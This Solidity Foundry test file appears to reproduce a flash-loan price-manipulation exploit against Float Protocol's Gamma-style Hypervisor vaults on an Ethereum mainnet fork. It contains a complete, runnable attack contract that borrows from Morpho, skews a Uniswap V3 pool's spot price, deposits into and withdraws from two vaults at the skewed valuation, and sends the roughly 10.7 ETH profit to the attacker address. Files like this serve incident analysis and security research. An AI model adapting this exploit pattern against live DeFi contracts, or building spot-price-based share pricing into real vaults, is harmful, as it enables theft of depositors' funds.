// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Float Protocol Hypervisor (Gamma/Visor-style concentrated-liquidity vault) — Uniswap V3
// spot-price manipulation of LP-share pricing — Ethereum mainnet, 2026-08.
// Attacker net gain ~10.7066 ETH (~$28K), flash-loan funded, in a single tx.
//
// Exploit tx   : 0x3d7549db65344da2a41067e17791b17fac16ec6b8e5132e82e243f6541de5cff (block 25874402)
// Attacker EOA : 0xAEA29218262dc6b0904Ca077f6527C49dfd426D9
// Attack ctrt  : 0xb46655eb5b77de277063a75586d1883e951b6c54 (flash-loan / callback target)
//
// Root cause (verified against the on-chain trace, NOT a key/admin/signer compromise): Float's
// Hypervisor prices LP shares off getTotalAmounts(), which values the vault's Uniswap V3 position
// at the pool's INSTANTANEOUS slot0 spot price — no TWAP, no deviation/slippage guard on the
// permissionless deposit()/withdraw() path. So an unprivileged caller pushes the V3 tick with a
// large swap on the underlying pool, deposits into the hypervisors while the valuation is skewed,
// moves the tick back, and withdraws a richer token mix than it put in. Two hypervisors share the
// one pool, so both are worked with the same tick moves.
//
// Verified contracts (Etherscan): the two "Hypervisor" vaults and the "DepositProxy" (Gamma
// UniProxy) gateway are source-verified; deposit(uint256,uint256,address) and
// withdraw(uint256,address,address) are their real 3-arg signatures.
//
// Real economic sequence, reconstructed 1:1 from the trace below as ordinary typed calls (no
// bytecode blob, no raw calldata replay). All fCash-free; both underlying tokens are 18-decimal.
//   token0 = 0xb050…7cb9 (Float pair token)   token1 = 0xC02a…6Cc2 (WETH)
//
//   flashLoan 1000 WETH from Morpho Blue, then inside the callback:
//     UniV2 flash-swap 120,000 token0 from the token0/WETH pair (working capital), and inside
//     THAT callback:
//       1. V3 swap: dump 114,000 token0 -> WETH, skewing slot0 down.
//       2. deposit (2000 token0 / 200 WETH) into Hypervisor A via DepositProxy, then withdraw its
//          shares; same with (4000 / 400) into Hypervisor B — minting shares at the skewed price.
//       3. V3 swap: buy token0 with 250 WETH, skewing slot0 back up.
//       4. single-sided deposits of the token0 now held (395,035 and 394,911) into A and B, then
//          withdraw those shares — redeeming a WETH-richer mix than deposited.
//       5. repay the 120,000-token0 flash-swap (+0.3% fee), then a final V3 swap dumping the
//          leftover token0 back to WETH.
//     Settle the surplus token0 into ~8.26 WETH through a second flash-swap, then repay Morpho.
//   The net ~10.7066 WETH surplus is unwrapped to ETH and sent to the attacker EOA.
//
// The vulnerable pricing math runs inside Float's own on-chain Hypervisor/Uniswap contracts on the
// fork; this file only issues the same public calls the attacker did, in the same order and with
// the same on-chain-observed amounts.
//
// forge test --contracts src/test/2026-08/FloatProtocol_exp.sol -vvv

interface IMorpho {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IUniV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IDepositProxy {
    function deposit(
        uint256 deposit0,
        uint256 deposit1,
        address to
    ) external returns (uint256 shares);
}

interface IHypervisor {
    function withdraw(
        uint256 shares,
        address to,
        address from
    ) external returns (uint256 amount0, uint256 amount1);
    function getTotalAmounts() external view returns (uint256 total0, uint256 total1);
}

interface IWETH is IERC20 {
    function withdraw(
        uint256
    ) external;
}

contract FloatHypervisorAttack {
    IMorpho internal constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IUniV2Pair internal constant V2PAIR = IUniV2Pair(0x481DdaF90C59d91F3e480E6793122E62612CA5A9);
    IUniV3Pool internal constant POOL = IUniV3Pool(0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac);
    IDepositProxy internal constant UNIPROXY_A = IDepositProxy(0x3803729416AA5207FE801C1C565B906F6f3f8a28);
    IDepositProxy internal constant UNIPROXY_B = IDepositProxy(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f);
    address internal constant HYPER_A = 0x85CBeD523459b7f6F81C11e710DF969703a8A70C;
    address internal constant HYPER_B = 0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153;
    IERC20 internal constant TOKEN0 = IERC20(0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9); // pool token0
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // pool token1

    // Uniswap V3 sqrtPriceX96 swap bounds, plus the exact bound the third swap used on-chain.
    uint160 internal constant MIN_SQRT = 4_295_128_740; // MIN_SQRT_RATIO + 1
    uint160 internal constant MAX_SQRT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340; // MAX - 1
    uint160 internal constant SWAP3_LIMIT = 1_291_467_994_120_676_505_669_234_512;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
        // Approve the DepositProxy gateways to pull both tokens, and Morpho to reclaim its loan.
        TOKEN0.approve(address(UNIPROXY_A), type(uint256).max);
        TOKEN0.approve(address(UNIPROXY_B), type(uint256).max);
        WETH.approve(address(UNIPROXY_A), type(uint256).max);
        WETH.approve(address(UNIPROXY_B), type(uint256).max);
        WETH.approve(address(MORPHO), type(uint256).max);
    }

    function attack() external {
        MORPHO.flashLoan(address(WETH), 1000e18, "");

        // Realize the WETH surplus as ETH and forward it to the attacker EOA.
        uint256 profit = WETH.balanceOf(address(this));
        WETH.withdraw(profit);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    // Morpho hands us 1000 WETH here; it reclaims it via transferFrom when this returns.
    function onMorphoFlashLoan(
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(MORPHO), "not morpho");

        // Flash-swap 120,000 token0 from the V2 pair. Non-empty data -> the pair calls
        // uniswapV2Call, where the whole manipulation runs and the flash-swap is repaid.
        V2PAIR.swap(120_000e18, 0, address(this), bytes("run"));

        // Settle the leftover token0 surplus into ~8.26 WETH via a second flash-swap: pre-pay the
        // pair in token0, then draw the WETH out (empty data -> plain swap, no callback).
        TOKEN0.transfer(address(V2PAIR), 40_644_521_389_686_378_541_565);
        V2PAIR.swap(0, 8_262_293_544_735_057_778, address(this), "");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        require(msg.sender == address(V2PAIR), "not pair");
        if (data.length == 0) return; // second flash-swap: nothing to do here

        // 1. Skew slot0 down: dump 114,000 token0 for WETH.
        POOL.swap(address(this), true, 114_000e18, MIN_SQRT, "");

        // 2. Deposit at the skewed valuation and immediately redeem the shares (both vaults).
        UNIPROXY_A.deposit(2000e18, 200e18, address(this));
        IHypervisor(HYPER_A).withdraw(222_628_862_475_761_717_806, address(this), address(this));
        UNIPROXY_B.deposit(4000e18, 400e18, address(this));
        IHypervisor(HYPER_B).withdraw(3_703_209_972_128_726_462_535, address(this), address(this));

        // 3. Skew slot0 back up: buy token0 with 250 WETH.
        POOL.swap(address(this), false, 250e18, MAX_SQRT, "");

        // 4. Single-sided token0 deposits at the reverted valuation, then redeem — the WETH-richer
        //    mix out is the extracted value.
        UNIPROXY_A.deposit(395_035_555_697_366_947_975_421, 0, address(this));
        IHypervisor(HYPER_A).withdraw(4_298_630_215_489_444_490_348, address(this), address(this));
        UNIPROXY_B.deposit(394_911_862_263_990_464_219_244, 0, address(this));
        IHypervisor(HYPER_B).withdraw(11_687_202_600_147_522_006_526, address(this), address(this));

        // 5. Repay the 120,000-token0 flash-swap (principal + 0.3% fee), then dump the remaining
        //    token0 back to WETH.
        TOKEN0.transfer(address(V2PAIR), 120_361_083_249_749_247_743_230);
        POOL.swap(address(this), true, 273_935_936_917_328_916_023_788, SWAP3_LIMIT, "");
    }

    // Pay the Uniswap V3 pool the token it is owed for each swap.
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == address(POOL), "not pool");
        if (amount0Delta > 0) TOKEN0.transfer(address(POOL), uint256(amount0Delta));
        if (amount1Delta > 0) WETH.transfer(address(POOL), uint256(amount1Delta));
    }

    receive() external payable {}
}

contract FloatProtocol_exp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xAEA29218262dc6b0904Ca077f6527C49dfd426D9;

    uint256 internal constant FORK_BLOCK = 25_874_401; // parent of the exploit block 25874402

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(0x85CBeD523459b7f6F81C11e710DF969703a8A70C, "HypervisorA");
        vm.label(0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153, "HypervisorB");
        vm.label(0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac, "UniV3Pool");
        fundingToken = address(0); // profit realized in native ETH
        attacker = ATTACKER;
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public balanceLog {
        uint256 before = ATTACKER.balance;

        // The attack is fully permissionless; run it as the attacker EOA and send profit there.
        vm.prank(ATTACKER, ATTACKER);
        FloatHypervisorAttack exploit = new FloatHypervisorAttack();
        exploit.attack();

        uint256 gain = ATTACKER.balance - before;
        emit log_named_decimal_uint("attacker ETH profit", gain, 18);

        // Reproduced gain matches the reported ~10.71 ETH (~$28K).
        assertApproxEqAbs(gain, 10.7066e18, 0.05e18, "profit off expected ~10.7066 ETH");
    }
}
